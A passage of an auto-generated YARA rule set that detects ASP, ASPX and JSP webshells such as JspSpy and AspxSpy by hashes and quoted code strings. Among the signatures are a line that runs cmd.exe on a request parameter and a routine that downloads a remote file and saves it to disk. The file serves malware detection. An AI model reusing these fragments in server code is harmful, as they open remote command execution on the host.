      hash1 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
      hash2 = "331d081d6fa2241b5b695dffcdf830d9bcd52d97a472057168a4a487215f805b"
      hash3 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
      hash4 = "a7da83250466100782ccb95ef8e2b4c5832df8811e99b8e332594a869391dfa6"
      hash5 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
      hash6 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
      hash7 = "a35878e74425cd97ad98e3ec4b2583867bb536f4275d821cd8b82bc19380ba1a"
   strings:
      $s1 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
      $s2 = "<%@ import Namespace=\"System.Data.OleDb\"%>" fullword ascii
      $s3 = "<%@ Import Namespace=\"System.Data.SqlClient\"%>" fullword ascii
      $s4 = "<%@ import Namespace=\"System.Data\"%>" fullword ascii
      $s5 = "<%@ import Namespace=\"System.Management\"%>" fullword ascii
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _ASPXspy2_icesword_AspxSpy2014Final_111_aspx_con2_470 {
   meta:
      description = "webshell - from files ASPXspy2.aspx, icesword.aspx, AspxSpy2014Final.aspx, 111.aspx, aspx.aspx, con2.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
      hash2 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
      hash3 = "a7da83250466100782ccb95ef8e2b4c5832df8811e99b8e332594a869391dfa6"
      hash4 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
      hash5 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
      hash6 = "d175b3176f1fb891735a2aaed2bc851074b3b50d4eb99c90146dc6a0eaa26d48"
   strings:
      $s1 = "<asp:TableRow CssClass=\"head\"><asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS<" ascii
      $s2 = "<asp:TableRow CssClass=\"head\"><asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS<" ascii
      $s3 = "sp:TableCell><asp:TableCell>Domain</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>" fullword ascii
      $s4 = "<table width=\"100%\" border=\"0\" cellpadding=\"4\" cellspacing=\"0\" style=\"margin:10px 0;\">" fullword ascii
      $s5 = "</asp:Table>" fullword ascii
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _404_data02_Jsp_leo_suiyue_471 {
   meta:
      description = "webshell - from files 404.jsp, data02.jsp, Jsp.jsp, leo.jsp, suiyue.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
      hash2 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
      hash3 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
      hash4 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash5 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
   strings:
      $s1 = "  public UplInfo() {" fullword ascii
      $s2 = "  public long starttime;" fullword ascii
      $s3 = "  public long totalSize;" fullword ascii
      $s4 = "  public boolean aborted;" fullword ascii
      $s5 = "  public long currSize;" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 90KB and ( all of them )
      ) or ( all of them )
}

rule _404_Jsp_jfolder01_JFolder_shell1_jsp_suiyue_472 {
   meta:
      description = "webshell - from files 404.jsp, Jsp.jsp, jfolder01.jsp, JFolder.jsp, shell1.jsp, jsp.jsp, suiyue.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
      hash2 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
      hash3 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash4 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash5 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash6 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
      hash7 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
   strings:
      $s1 = "<p>&nbsp;&nbsp;&nbsp; 2004.10.27&nbsp; " fullword ascii
      $s2 = "<p>&nbsp;&nbsp;&nbsp; 2004.11.15&nbsp; V0.9" fullword ascii
      $s3 = "<p>&nbsp;&nbsp;&nbsp;<b>" fullword ascii
      $s4 = "<p>&nbsp;&nbsp;&nbsp; 2004.09.20&nbsp; " fullword ascii
      $s5 = "jsp&nbsp;" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 90KB and ( all of them )
      ) or ( all of them )
}

rule _c5_403_queryDong_myxx1_config_000_zend_spyjsp2010_SJavaWebManageV1_4_473 {
   meta:
      description = "webshell - from files c5.jsp, 403.jsp, queryDong.jsp, myxx1.jsp, config.jsp, 000.jsp, zend.jsp, spyjsp2010.jsp, SJavaWebManageV1.4.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash3 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash4 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
      hash5 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash6 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash7 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
      hash8 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash9 = "ecf43efae44a4fb4078bc7da76e07cc10fe4e92fc145b58d7999f0cc2b902cde"
   strings:
      $s1 = "b = colName.getBytes();" fullword ascii
      $s2 = "b = colName.getBytes(encode);" fullword ascii
      $s3 = "b = v.getBytes();" fullword ascii
      $s4 = "b = v.getBytes(encode);" fullword ascii
      $s5 = "byte[] b = null;" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _c5_m_he1p_1_nogfw_JspSpy1_403_luci_jsp_spy2009_queryDong_a_config_JspSpyJDK5_JspSpyJDK51_u_000_t00ls1_css_807_jspspy_k8_jsp_474 {
   meta:
      description = "webshell - from files c5.jsp, m.jsp, he1p.jsp, 1.jsp, nogfw.jsp, JspSpy1.jsp, 403.jsp, luci.jsp.spy2009.jsp, queryDong.jsp, a.jsp, config.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, u.jsp, 000.jsp, t00ls1.jsp, css.jsp, 807.jsp, jspspy_k8.jsp, jspspy.jsp, zend.jsp, t00ls.jsp, ma3.jsp, spyjsp2010.jsp, ok.jsp, style.jsp, cofigrue.jsp, dm.jsp, xia.jsp, x7.jsp, mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash3 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
      hash4 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
      hash5 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
      hash6 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
      hash7 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash8 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
      hash9 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash10 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
      hash11 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash12 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash13 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
      hash14 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
      hash15 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash16 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash17 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
      hash18 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash19 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash20 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
      hash21 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
      hash22 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash23 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
      hash24 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash25 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
      hash26 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
      hash27 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash28 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash29 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
      hash30 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
      hash31 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $s1 = "dbo = new DBOperator(driver,url,uid,pwd);" fullword ascii
      $s2 = "dbo = new DBOperator(driver,url,uid,pwd,true);" fullword ascii
      $s3 = "((DBOperator)oldDbo).close();" fullword ascii
      $s4 = "((DBOperator)dbo).connect();" fullword ascii
      $s5 = "DBOperator oldDbo = (DBOperator)dbo;" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _m_luci_jsp_spy2009_a_JspSpyJDK5_JspSpyJDK51_u_css_807_jspspy_k8_jspspy_ma3_cofigrue_dm_xia_x7_mmym520_475 {
   meta:
      description = "webshell - from files m.jsp, luci.jsp.spy2009.jsp, a.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, u.jsp, css.jsp, 807.jsp, jspspy_k8.jsp, jspspy.jsp, ma3.jsp, cofigrue.jsp, dm.jsp, xia.jsp, x7.jsp, mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash2 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
      hash3 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
      hash4 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash5 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
      hash6 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
      hash7 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
      hash8 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash9 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash10 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
      hash11 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
      hash12 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash13 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash14 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
      hash15 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
      hash16 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $s1 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total  (unk" ascii
      $s2 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total  (unk" ascii
      $s3 = "String execute = \"\";" fullword ascii
      $s4 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / unknow </td>\"+" fullword ascii
      $s5 = "h2>\");" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _wsproxy_wsAddAllContainer_wscmd_476 {
   meta:
      description = "webshell - from files wsproxy.jsp, wsAddAllContainer.jsp, wscmd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "01fb2195996b654410d45165d7c47a0bf437b102e4408205c93eb9c5c4baec3e"
      hash2 = "5e3ed0fd9571701802cff84d529d0f339ad3d73ca1a7c707b1d5738961d9c191"
      hash3 = "677db2639e3b72d3f906336276e66df8bd6e249e95b4076165a2a813a70057be"
   strings:
      $s1 = "<%@ page import=\"javax.websocket.server.ServerEndpointConfig\" %>" fullword ascii
      $s2 = "        public void onOpen(final Session session, EndpointConfig config) {" fullword ascii
      $s3 = "<%@ page import=\"javax.websocket.*\" %>" fullword ascii
      $s4 = "<%@ page import=\"javax.websocket.server.ServerContainer\" %>" fullword ascii
      $s5 = "    String path = request.getParameter(\"path\");" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 20KB and ( all of them )
      ) or ( all of them )
}

rule _cmd_win32_102_477 {
   meta:
      description = "webshell - from files cmd_win32.jsp, 102.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a577587bd71c3928ba7902f147a18ab647e1478e0559ec1f213fcbf6c227b991"
      hash2 = "e0539a2d4e132884adc135c8438f7647ddd6be61f1f9d83966b12f17382a1296"
   strings:
      $x1 = "        Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"cmd\"));" fullword ascii
      $x2 = "// cmd.jsp = Command Execution (win32)" fullword ascii
      $s3 = "        out.println(\"Command: \" + request.getParameter(\"cmd\") + \"\\n<BR>\");" fullword ascii
      $s4 = "<%@ page import=\"java.util.*,java.io.*,java.net.*\"%>" fullword ascii
      $s5 = "                out.println(disr); disr = dis.readLine(); }" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 2KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _utils_jdbc_478 {
   meta:
      description = "webshell - from files utils.jsp, jdbc.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4bfe0d96c929ca04283f61b88dc2382fa4f5f6ea5735f0c3d3900c590e98bda6"
      hash2 = "c8ef23e6759e2dd84f28fc1ec5ae913b35c8efb05dd6aa2951aed9fe867553a1"
   strings:
      $s1 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";" fullword ascii
      $s2 = ".charAt(i + 1))));" fullword ascii
      $s3 = ".write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d" fullword ascii
      $s4 = "}//new String(s.getBytes(\"ISO-8859-1\"),c);}" fullword ascii
      $s5 = "request.setCharacterEncoding(cs);" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 20KB and ( all of them )
      ) or ( all of them )
}

rule _action_list1_479 {
   meta:
      description = "webshell - from files action.jsp, list1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2d89359c199d77c6bc80758793fdcdc7baf14eea629222cf13d8ad775fce6452"
      hash2 = "43155417ae71646a6caa1151c865fd26c2ac8f333aa155123310e252c23f8827"
   strings:
      $s1 = "<meta http-equiv=Content-Type content=\"text/html; charset=gb2312\">" fullword ascii
      $s2 = "td{white-space:nowrap;}" fullword ascii
      $s3 = "a{color:black;text-decoration:none;}" fullword ascii
      $s4 = "body,td{font-size: 12px;}" fullword ascii
      $s5 = "body{margin-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;}" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 100KB and ( all of them )
      ) or ( all of them )
}

rule _asp___1__asp__1___2014_10_23_14_54_16_NEW_WebShell__1__asp__1__asp__1_480 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1).asp, asp (1).asp, asp (1).asp, .asp, asp.asp, asp (1)__2014-10-23-14-54-16.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, vps.asp, NEW WebShell.asp,  (1)__2014-10-23-14-54-16.asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash5 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash6 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash7 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash8 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash9 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash10 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash11 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash12 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash13 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
      hash14 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "set newTime=request.Form(\"time\")" fullword ascii
      $s2 = "&nbsp;&nbsp;\"&path&fileName&\"&nbsp;&nbsp;" fullword ascii
      $s3 = "set path=request.Form(\"path1\")" fullword ascii
      $s4 = "if( (len(path)>0)and(len(fileName)>0)and(len(newTime)>0) )then" fullword ascii
      $s5 = "set fileName=request.Form(\"filename\")" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _asp___1__4_0_2013110125027897_asp__1___2014_10_23_14_54_16__2014_asp_481 {
   meta:
      description = "webshell - from files asp.asp,  (1).asp, 4.0.asp, 2013110125027897.asp, asp (1)__2014-10-23-14-54-16.asp, _2014.asp, asp (1).asp, 4.0 (1).asp, UnKnown Vip (1).asp, asp (1).asp, .asp, asp.asp, UnKnown Vip.asp, asp (1)__2014-10-23-14-54-16.asp, _2012.asp, .asp, vps.asp,  (1).asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash3 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash4 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash5 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash6 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash7 = "afa4d004314ff296712e8d2c7d7707cc66b7c42bc4ba7beb3e4faf585a255894"
      hash8 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash9 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash10 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash11 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash12 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
      hash13 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash14 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash15 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash16 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash17 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash18 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash19 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "Http.Open \"GET\", theUrl, False" fullword ascii
      $s2 = "Http.Send()" fullword ascii
      $s3 = ".Write Http.ResponseBody" fullword ascii
      $s4 = "With stream" fullword ascii
      $s5 = ".SaveToFile thePath, overWrite" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule ___1__NEW_WebShell__1___NEW_WebShell__1___2014_10_23_14_54_16_NEW_WebShell___1___2_482 {
   meta:
      description = "webshell - from files  (1).asp, NEW WebShell (1).asp, .asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, NEW WebShell.asp,  (1)__2014-10-23-14-54-16.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
      hash2 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash3 = "187f477b13e2124e9c252dcb4d385407eee5aadcc466467ce959d388aaff2e0d"
      hash4 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash5 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash6 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "RRS\"BODY {SCROLLBAR-FACE-COLOR: #000000;SCROLLBAR-HIGHLIGHT-COLOR: #00fcfc;SCROLLBAR-SHADOW-COLOR: #00fcfc;SCROLLBAR-ARROW-COLO" ascii
      $s2 = ": #00fcfc;SCROLLBAR-TRACK-COLOR: #000000;SCROLLBAR-DARKSHADOW-COLOR: #00fcfc;SCROLLBAR-BASE-COLOR: #000000}\"" fullword ascii
      $s3 = "RRS\"BODY {SCROLLBAR-FACE-COLOR: #000000;SCROLLBAR-HIGHLIGHT-COLOR: #00fcfc;SCROLLBAR-SHADOW-COLOR: #00fcfc;SCROLLBAR-ARROW-COLO" ascii
      $s4 = "RRS\".am{color:#888;font-size:11px;}\"" fullword ascii
      $s5 = "RRS\"a{color:#ddd;text-decoration: none;}a:hover{color:red;background:#000}\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014__2014_4_0__1___2013__2012____1__r_483 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, .asp, 2014.asp, 4.0 (1).asp, .asp, 2013.asp, _2012.asp, .asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "0ba9d0d668d00ee68a2869c6a1b9c05f08469daa84f177079e76e4baeef7748c"
      hash5 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash6 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash7 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash8 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash9 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash10 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash11 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash12 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "if Request.TotalBytes>0 then" fullword ascii
      $s2 = "If D1.exists(F) then:Form=D1(F):else:Form=\"\":end if" fullword ascii
      $s3 = "TDa=\"\"" fullword ascii
      $s4 = "T2.Close" fullword ascii
      $s5 = "F=lcase(F)" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_NEW_WebShell__1__2014_4_0__1__UnKnown_Vip__1__UnKnown_Vi_484 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, NEW WebShell (1).asp, 2014.asp, 4.0 (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, _2012.asp, .asp, NEW WebShell.asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash5 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash6 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash7 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash8 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash9 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash10 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash11 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash12 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash13 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash14 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
